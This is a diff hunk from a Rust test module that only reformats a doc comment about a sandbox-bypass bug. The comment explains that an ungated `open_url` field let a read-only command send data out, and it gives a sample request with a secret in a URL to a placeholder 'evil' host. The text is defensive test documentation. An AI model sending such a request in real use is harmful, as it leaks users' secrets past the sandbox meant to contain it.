@@ -1160,7 +1160,7 @@ mod tests {
 
     /// `open_url` reaches `open_browser_url` in the UNSANDBOXED parent, and
     /// `execute()` builds its `ActionRequest` from `command` alone — so the
-    /// URL was never gated. A ReadOnly command then carried an arbitrary URL
+    /// URL was never gated. A `ReadOnly` command then carried an arbitrary URL
     /// out of the two modes that exist to prevent exactly that:
     /// `{"command": "cat README.md", "mode": "background",
     ///   "open_url": "https://evil/?d=<secret>"}`.
